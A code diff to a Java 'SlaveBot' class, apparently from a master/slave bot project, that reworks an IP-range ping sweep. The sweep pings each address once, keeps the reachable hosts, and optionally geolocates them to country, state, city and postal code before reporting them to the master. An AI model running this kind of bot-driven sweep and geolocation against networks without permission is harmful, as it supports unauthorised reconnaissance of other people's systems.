@@ -2,8 +2,6 @@ import java.net.*;
 import java.util.*;
 import java.io.*;
 
-import javax.tools.DocumentationTool.Location;
-
 import com.maxmind.geoip2.DatabaseReader;
 import com.maxmind.geoip2.exception.GeoIp2Exception;
 import com.maxmind.geoip2.model.CityResponse;
@@ -209,36 +207,6 @@ public class SlaveBot extends Thread
 		String randomString = stringBuilder.toString();
 		return randomString;
 	}
-//--scan---------------------------------------------------------------------------------------------------------------------------------------	
-	public boolean scan(String input) 
-    {
-        String ip = input;
-        String pingResult = "";
-
-        String pingCmd = "ping " + ip;
-        try 
-        {
-            Runtime r = Runtime.getRuntime();
-            Process p = r.exec(pingCmd);
-
-            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
-            String inputLine;
-            while ((inputLine = in.readLine()) != null) 
-            {
-                pingResult += inputLine;
-            }
-            in.close();
-            if (pingResult.contains("(0% loss)"))
-            {
-            	return true;
-            }
-        } catch (IOException e) 
-        {
-            System.out.println(e);
-        }
-		return false;
-
-    }
 //--Runnable1 class method for ipscan thread---------------------------------------------------------------------------------------------------
 	class Runnable1 implements Runnable
 	{
@@ -251,55 +219,70 @@ public class SlaveBot extends Thread
 				String[] range = ipStringRange.split("-");
 				String[] tupleStart = range[0].split("\\.");
 				String[] tupleEnd = range[1].split("\\.");
-		
-				// only for slave 
-				if(tupleStart[0].equals("127") && tupleStart[1].equals("0") && tupleStart[2].equals("0"))
+				long result1 = 0;
+				long result2 = 0;
+				
+				for (int i = 0; i < tupleStart.length; i++) 
 				{
-					if(scan("127.0.0.1"));
-						listOfResponsdedTarget.add("127.0.0.1");
-					m.printIpScan(listOfResponsdedTarget);
+					int power = 3 - i;
+					int ip = Integer.parseInt(tupleStart[i]);
+					result1 += ip * Math.pow(256, power);
 				}
-				else
+				
+				for (int i = 0; i < tupleEnd.length; i++) 
 				{
-					long result1 = 0;
-					long result2 = 0;
-					
-					for (int i = 0; i < tupleStart.length; i++) 
+					int power = 3 - i;
+					int ip = Integer.parseInt(tupleEnd[i]);
+					result2 += ip * Math.pow(256, power);
+				}
+				
+				for (long i = result1; i < (result2 + 1); ++i)
+				{
+					long new_result1 = i;
+					String ipString;
+					StringBuilder sb = new StringBuilder(15);
+					for (int j = 0; j < 4; j++) 
 					{
-						int power = 3 - i;
-						int ip = Integer.parseInt(tupleStart[i]);
-						result1 += ip * Math.pow(256, power);
-					}
-					
-					for (int i = 0; i < tupleEnd.length; i++) 
-					{
-						int power = 3 - i;
-						int ip = Integer.parseInt(tupleEnd[i]);
-						result2 += ip * Math.pow(256, power);
-					}
-					
-					for (long i = result1; i < (result2 + 1); ++i)
-					{
-						long new_result1 = i;
-						String ipString;
-						StringBuilder sb = new StringBuilder(15);
-						for (int j = 0; j < 4; j++) 
+						sb.insert(0,Long.toString(new_result1 & 0xff));
+						if (j < 3) 
 						{
-							sb.insert(0,Long.toString(new_result1 & 0xff));
-							if (j < 3) 
-							{
-								sb.insert(0,'.');
-							}
-							new_result1 = new_result1 >> 8;
+							sb.insert(0,'.');
 						}
-						ipString = sb.toString();
-						InetAddress ip = InetAddress.getByName(ipString);
-						if(ip.isReachable(200) && isGeo)
-						{	
-							String data = "";
-							File database = new File("src/GeoLite2-City.mmdb");
+						new_result1 = new_result1 >> 8;
+					}
+					ipString = sb.toString();
+					InetAddress ip = InetAddress.getByName(ipString);
+					boolean isWindows = System.getProperty("os.name").toLowerCase().contains("win");;
+			        String pingResult = "";
+			        String pingCmd = "";
+			        
+			        if (isWindows)
+			        {
+			        	pingCmd = "ping -n 1 " + ipString;
+			        }
+			        else
+			        {
+			        	pingCmd = "ping -c 1 " + ipString;
+			        }
+			        
+			        try 
+			        {
+			            Runtime r = Runtime.getRuntime();
+			            Process p = r.exec(pingCmd);
+
+			            BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
+			            String inputLine;
+			            while ((inputLine = in.readLine()) != null) 
+			            {
+			                pingResult += inputLine;
+			            }
+			            in.close();
+			            if(isGeo && ( pingResult.contains("0% packet loss") ||pingResult.contains("(0% loss)"))) 
+						{
+			            	String data;
+							File database = new File("GeoLite2-City.mmdb");
 							DatabaseReader reader = new DatabaseReader.Builder(database).build();
-							CityResponse response = reader.city(ip);
+	                       	CityResponse response = reader.city(ip);
 							Country country = response.getCountry();
 							Subdivision subdivision = response.getMostSpecificSubdivision();
 							City city = response.getCity();
@@ -308,15 +291,19 @@ public class SlaveBot extends Thread
 							data = ipString + ", Country: " + country.getName() 
 							+ ", State: " + subdivision.getName() + ", City: " + city.getName() 
 							+ ", Postal Code: " + postal.getCode() + ".";
+							
 							listOfResponsdedTarget.add(data);
 						}
-						else if(ip.isReachable(200) && !isGeo)
-						{
-							listOfResponsdedTarget.add(ipString);
-						}
-					}		
-					m.printIpScan(listOfResponsdedTarget);
-				}
+			            if(!isGeo && ( pingResult.contains("0% packet loss") ||pingResult.contains("(0% loss)")))
+			            {
+			            	listOfResponsdedTarget.add(ipString);
+			            }
+			        } catch (IOException e) 
+			        {
+			            System.out.println(e);
+			        }
+				}		
+				m.printIpScan(listOfResponsdedTarget);
 			} catch(IOException e)
 			{
 				System.out.println("ipScan Failure.");
